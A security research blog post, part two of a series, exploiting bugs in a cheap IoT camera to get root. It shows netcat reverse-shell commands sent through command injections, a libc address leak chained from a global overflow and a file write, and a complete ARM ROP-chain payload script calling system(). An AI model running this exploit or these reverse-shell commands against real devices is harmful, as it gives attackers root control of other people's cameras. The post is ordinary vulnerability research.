---
published: true
title: "📷 Analysing a Wireless Network Camera [2]: Popping Shells"
toc: true
toc_sticky: true
categories:
  - VR
tags:
  - ARM
  - Exploitation
  - Command Injection
  - Memory Corruption
tagline: "In the last blog, we found a bunch of bugs in an Aliexpress IoT Camera when its in a pre-configured state via its hotspot. Lets try and exploit them to get us a root shell without having to take it to pieces."
excerpt: "Now that we have some bugs, lets pop some shells!"
header:
  teaser: /assets/images/analysing_a_dirt_cheap_router/mcu.jpg
  overlay_image: /assets/images/analysing_a_dirt_cheap_router/mcu.jpg
  overlay_filter: 0.4
  #caption: "Photo credit: [**Unsplash**](https://unsplash.com)"
---

# Whats the point?

When I wrote the first blog, I figured the bugs I found in the *daemon* and *anyka_ipc* processes weren't that useful because there is a shell on the camera via UART, which is very easy to interface with. Then I remembered how much of a pain it was to take it apart and put it back together, so I figured exploiting these bugs for a shell would actually be quite useful. Plus, I've done very little memory corruption on Linux-based systems, and I have literally never 'popped a shell' before. So in this blog, we are going to be popping some shells!

# Command Injections

There are a couple of command injections present on the device that we found in the last blog, in both the *daemon* and *anyka_ipc* processes. Thanks to a very generous busybox implementation, there are loads of ways we can get a remote shell with these!

![busybox.png](/assets/images/analysing_a_wireless_network_camera_part_2/busybox.png)

I chose the easiest option of a nice and simple reverse shell using the **nc** command on the camera. *Netcat* (**nc**) is a command-line tool used for reading from and writing to network connections, allowing users to establish TCP or UDP connections and transfer data over networks. 

On the attacker device, open up a *netcat* listener with the following command:

```
nc -lvp 123
```

This will set up a socket on port 123 that listens for incoming connections. Next, we exploit the command injection we have on the device to set up the reverse shell, the following command is sufficient:

```
nc 192.168.10.20 123 -e ash
```

This command will execute **ash** (providing us with a shell), and will communicate with the attacker controlled device at the specified IP and port which we set up earlier. Executing this command will yield a successful connection to the target device with a shell running at *root* privilege!

## daemon

Here is the demo of the *daemon* command injection being exploited to get a reverse shell:

![daemon_cmd_injection.png](/assets/images/analysing_a_wireless_network_camera_part_2/daemon_cmd_injection.png)

## libcloudapi

And here is the demo of the *libcloudapi* command injection being exploited to get a reverse shell:

![libcloudapi_cmd_injection.png](/assets/images/analysing_a_wireless_network_camera_part_2/libcloudapi_cmd_injection.png)

Command injections are very easy to exploit, you just send commands and they get executed. It gets trickier when there are limitations on size, bad characters, or you don't get a response (a *blind* command injection).

# Stack Overflow

With the easiest bugs out of the way, we can move on to the more involved task of exploiting the stack overflow we found in the *daemon* process. I've not done a huge amount with ARM previously, especially not writing exploits, so this will be a fun learning experience for both of us. 

As it stands, we have overwritten a return address on the stack and have hijacked execution, the aim is to turn this into a remote root shell like we did with the command injections. We know that NX is enabled on the binaries, so we won't be able to just slap shellcode on the stack and execute that - we'll need to ROP.

## Configuring gdb

When doing binary exploitation, it is MUCH easier if you have *gdb* attached to the process, as you can view memory, add break points, read memory, step through execution, etc. It is a great tool that makes life much much easier, and there are a couple of additions that improve the tool - I use *gef* (GDB Enhance Features) because its got a load of additional stuff that makes gdb much nicer to look at/use.

### Camera

To get *gdb* on the camera, we will need two things - a *gdbserver* running on the device, and a *gdb* instance on a computer on the same network. To get it onto the device, we will need to either cross-compile it (here's my blog on doing this for the router), or borrow someone else's cross-compiled binary for ARM little-endian 32 bit. It didn't take me very long to find one on Github that will do just fine. 

Now that we have a *gdbserver* binary, we need to get it onto the camera. Luckily, we found a nice arbitrary file write that we can use to easily send arbitrary files to the **/tmp** directory, which will work perfectly. The FTP server would have been good enough, but this also works!

Once this is on the device, we need to figure out the process ID of the binary that we would like to attach to. This is as simple as running **ps** and finding the *daemon* process in the list. We need this so we can tell our *gdbserver* what process it needs to work with. 

With the binary on the camera, and the PID of a process, we can start up *gdbserver* with the following command:

```
/tmp/gdbserver-static --attach 127.0.0.1:12345 *PID*
```

This will set up the server to listen on port 12345 for incoming connections from any network-connected devices that wish to debug the process. 

### PC

To install the *gdb* client, run the following:

```
sudo apt-get install gdb-multiarch
```

And if you want *gef*:

```
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

Now we can run **gdb-multiarch** to get into the *gdb* environment:

![gef.png](/assets/images/analysing_a_wireless_network_camera_part_2/gef.png)

Next, we can connect to the server running on the camera with:

```
get-remote 192.168.10.1 12345
```

Or if you are using vanilla *gdb*:

```
target remote 192.168.10.1:12345
```

This should remotely load symbols from the binaries on the camera, and set up everything we need to do some debugging. If you want a quick gdb guide, this is a decent cheatsheet to get started.

## Viewing the Crash

With gdb configured, we can continue execution with **continue**, and use our PoC script for the stack overflow to trigger the crash. Here is the output:

![crash_gef.png](/assets/images/analysing_a_wireless_network_camera_part_2/crash_gef.png)

We can see that loads of registers have been overwritten (*r4*-*r9*), which makes sense as at the end of functions these registers are getting popped off of the stack before the *pc* is overwritten, which we can also see has a value of *0x41414140*. Having this quick summary of registers, stack, threads, etc is one of the great things about *gef*!

A couple of additional things to note. If we look at the stack output, we can see the *" /var/stat &"* which we know is immediately after our payload. Also, the registers that contain values starting with *0xb6f* are pretty high, and are usually a pretty good indication that some libraries are being loaded dynamically, so they are loaded on runtime from other files rather than being statically within the *daemon* binary itself. Lets check this with the **info proc mappings** gdb command:

![info_proc_mappings.png](/assets/images/analysing_a_wireless_network_camera_part_2/info_proc_mappings.png)

So we can see there are a few libraries mapped into high memory addresses, these addresses are not consistent and change every time the binary is run. This means if we want to use these libraries for exploitation, we need to get the base address of one of the libraries so we know the location of gadgets to use in our ROP-chain. 

## Leaking libc Base Address

As we discovered in the last section, we will need to leak the base address of *libc* in order to locate the gadgets we need for exploiting the stack overflow. I tried a couple of methods to get this information out of the camera remotely.

### Method 1 - FTP

We know that there is an FTP server running on the device with username '*root*' with no password. I also noticed that the *daemon* process always had a PID of *425* on boot, which means we should be able to extract the */proc/425/maps* file from the device to get the *libc* base address. The contents of the *maps* file is the same as the output of the **info proc mappings** command we saw earlier in *gdb*.

This method works, but it feels too legit, I would love to utilise some of the bugs I found to leak the base address!

### Method 2 - File Write + Global Overflow

I really wanted to utilize the useless overflow we discovered in the last blog that overwrites a bunch of config values, so I had another look at what we overwrite and how it is used elsewhere. 

If you think back to the last blog, you'll remember that weird *8192* port we found that was being hosted by *daemon*, and if you sent it *Anyka IPC ,Get IP Address*` it would send you back some camera details. It turns out that this information is fetched from the config struct that we overwrite.

In our global overflow, the same of the struct we overwrite is *sys_config* (we know this because these binaries have symbols), which contains a list of pointers to various other structures containing a bunch of camera-related info. Therefore, we could possibly overwrite one of these pointers to instead point to some data in memory that contains a useful pointer (something in the dynamically linked libraries) we can use to calculate the *libc* base address. We can then make a request to *8192* to leak the pointer that the *sys_config* struct now points to!

![sys_config_struct.png](/assets/images/analysing_a_wireless_network_camera_part_2/sys_config_struct.png)

We can see the struct in a fixed memory location here:

![pre_global_overflow.png](/assets/images/analysing_a_wireless_network_camera_part_2/pre_global_overflow.png)

And we can see it being overflowed here:

![post_global_overflow.png](/assets/images/analysing_a_wireless_network_camera_part_2/post_global_overflow.png)

#### Global Overflow Limitations

Unfortunately, as mentioned in the previous blog, there are some limitations on what we can actually get into the buffer. Firstly, we need to get our payload string through an **access()** call. Therefore, we are probably going to need a filename that ends in a few desired characters, and hope there is a useful pointer lying about in that area of memory. Note that we do have a nice arbitrary file write we found in the previous blog, and used to upload our gdbserver to the camera, so if we need to force a filename in the *tmp* directory we should be able to pull that off. Positioning this filename in the payload will be simple as we can just pad with '.', '..', and '/' until its positioned correctly. 

Another notable constraint of this approach is that addresses containing useful ASCII characters must be properly mapped into memory. Additionally, due to the adding of a null terminator to the copied memory, we can only insert a single zero at the end of our overflow. Consequently, if the mapped addresses include zeros, we can only overwrite the initial used pointer in the struct; otherwise, we might encounter a page fault when attempting to access the sub-struct at that location. This does mean that we can insert a zero into an address without overwriting the rest of the address (thanks to little-endianness).

#### Region 1 - Heap

If we look back at the memory map from earlier, we will see that the only memory that is reliably in a fixed position that should give us what we want is the heap. Using *gdb* to dump the heap, and searching for addresses in the heap, there are a couple of viable pointers that we could utilise - provided we could get through the call to **access()**.

![pointers_in_heap.png](/assets/images/analysing_a_wireless_network_camera_part_2/pointers_in_heap.png)

After struggling for a few hours, it seems highly unlikely that we can use the heap for what we need. The problem is that the address starts with *0x0002*, and we can't include *0x02* in a filename to pass the **access()** check so we cannot overwrite the *0x2* and get a valid pointer. Also, if we change the fourth byte of the address, the third byte always becomes *0x0*, which is outside the heap address range. There are no usable pointers close to *0x00021400*, so setting the fourth byte to *0x0* is not an option. Annoyingly, if we could somehow set it to be *0x21000* there is a pointer in the perfect position to get a useful leak. Alas, we have to look into other memory regions to find a solution.

#### Region 2 - Globals

The next option is the region starting at *0x20000* just before the heap, this looks to be some global memory region, it has a bunch of GOT/PLT stuff and pointers to functions in shared libraries at the start so it should be useful. Note that this address still starts with *0x0002* so we will not be able to overflow the address completely. However, because the third byte of the address is *0x00*, we are able to set the fourth byte of the pointer to whatever we want, so we just need to hope there is a useful pointer at an offset that we can leak. 

![pointers_in_global.png](/assets/images/analysing_a_wireless_network_camera_part_2/pointers_in_global.png)

As there is definitely going to be a zero in the pointer that we control, we will only be able to overwrite the first pointer in the *sys_config* struct that information is fetched from. This struct is called *sys_user_config*, and it contains a bunch of strings and an integer. The information sent back on port *8192* is the *dev_name* string (*0x28* into struct), and the *soft_version* integer (*0xf0* into struct), so if we can get some information in either of these locations we are golden. 

![sys_user_config_struct.png](/assets/images/analysing_a_wireless_network_camera_part_2/sys_user_config_struct.png)

Lets look at the available pointers, the closest to our available locations are *0x20140* and *0x201b0* (see memory dump above). Lets work out the ASCII character the filename would have to end in to get data in these pointers into our leaked data:

```
0x201b0 - 0xf0 = 0x200C0 -> 0xc0 = À
0x20140 - 0xf0 = 0x20050 -> 0x50 = P
```

Looks like P is the better option here - we can work with that. There is not a file on this device by default that end in a P (or À) unfortunately, so we will need to utilise our file write primitive to get the desired file onto the filesystem.

#### Taking a Leak

Before we get carried away, we should check that our leak definitely works. We are expecting the value at address *0x20140* to be put into an **sprintf()** with the format string of **%d** and its type is an integer, so it could also be a negative integer because two's complement. This doesn't matter too much as long as we can convert it back to its original bytes.

Creating the file */tmp/P* on the device, then sending a daemon packet with the first filename being *../../././././././../../tmp/P* will change the *sys_user_config* pointer in the *sys_config* struct to be *0x20050*. We then request the details from *8192* and get the following response:

```
AKWIPC0000000010@192.168.10.1@255.255.255.0@192.168.10.1@194.168.4.100@194.168.8.100@1@all ATC media lib failed@-1225793536@7c:94:9f:52:5a:e4@
```

Here is a standard response:

```
AKWIPC0000000010@192.168.10.1@255.255.255.0@192.168.10.1@194.168.4.100@194.168.8.100@1@小K互联网摄像机@2000@7c:94:9f:52:5a:e4@
```

It should be pretty clear what has changed. Firstly, the *小K互联网摄像机* string (apparently Chinese for Small Internet Camera) has changed to '*all ATC media lib failed*', which is a string at address *0x20050 + 0x28 = 0x20078* (check the memory dump above). Secondly, the software version string has changed from *2000* to *-1225793536* - this should be our pointer! As the format string is **%d**, the output will be signed. If we convert this back to its byte representation we end up with a pointer, *0xb6efe000* - nice!

So, we've got a way to leak a pointer now, how do we use it? Well, this pointer always points to a fixed offset from the *libc* base, so we get the *libc* base by subtracting *0xa3000* from the offset. This gives us a way of reliably leaking the *libc* base without the FTP server which is pretty neat, we can finally move on to writing our exploit for the stack overflow we discovered.

## Exploiting Stack Overflow

We should now have all the ingredients to pop a shell, there is no ASLR or stack canaries or anything scary like that (I love embedded). 

### Breakdown

Here is the code that generates an exploit payload:

```
-python
 # Get function addresses we need from libc base
system_libc = libc_base + 0x4b4fc # 0x4b4fc
exit_libc = libc_base + 0x46c30 # 0x46c30

# Do the stack overflow and execute arbitrary command
payload = b'\x41' * 268 # pad until pc overwritten
payload += p32(libc_base + 0x4a5e0) # pc

# | 0x4a5e0 | ldmia sp!,{r3,pc} |
payload += p32(libc_base + 0x313f8) # r3 - copy r2 into r0
payload += p32(libc_base + 0x32c24) # pc

# | 0x32c24 | add r2,sp,#0x3c | blx r3 |

# | 0x313f8 | cpy r0,r2 | ldmia sp!,{r4,pc} |
payload += p32(0xdeadbeef) # r4
payload += p32(system_libc) # pc
payload += b"Aa0Aa1Aa" # padding
payload += p32(libc_base + 0x184f4) # pc

# | 0x184f4 | mov r0,#0x1 | ldmia sp!,{r4,pc} |
payload += p32(0xdeadbeef) # r4
payload += p32(exit_libc) # pc

payload += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab" # padding
payload += b"nc 192.168.10.20 123 -e ash #" # command to execute as system
```

We start by using our *libc* base to calculate the addresses of the **system()** and **exit()** calls. Next, we pad the input until we reach the first *pc* overwrite which we set to a gadget the loads *r3* and *pc* off of the stack. Our next gadget (which we just put into *pc*) simply puts the *sp* register + *0x3c* (which will be where our command is located) into the *r2* register, and then uses *blx* to branch to the gadget we just put into *r3*. This gadget just copies *r2* into *r0* to get our command string into the correct argument register. It then loads *r4* and *pc* off of the stack, we can ignore *r4*, and set the *pc* to be the address of **system()** as this will use our command as its first argument. 

**system()** will execute and we can regain control of execution further down the stack, where we put the value *1* into *r0* and call **exit()** to exit the program cleanly (we've executed **system()** at this point so we no longer care about this program). Finally at the end of the exploit, we place some padding to get our command string in the correct position, and then append the command string itself.

This exploit will cause the system to execute the **nc 192.168.10.1 123 -e ash** command, forking the process and connecting to our netcat listener running on 192.168.10.1 and giving us a reverse shell.

Here is a demo of the exploit using the global leak:

![global_overflow_poc.png](/assets/images/analysing_a_wireless_network_camera_part_2/global_overflow_poc.png)

And here is a demo of the exploit using the FTP leak for completeness:

![ftp_stack_overflow_poc.png](/assets/images/analysing_a_wireless_network_camera_part_2/ftp_stack_overflow_poc.png)

## Conclusion

To summarise, we found 3 distinct ways of getting a reverse shell, and used pretty much all the bugs we found in the previous blog in various exploits. We exploited 2 command injections, and chained 3 bugs (global overflow, file write, stack overflow) together to get a *libc* base address leak for the *daemon* process and a reverse shell. 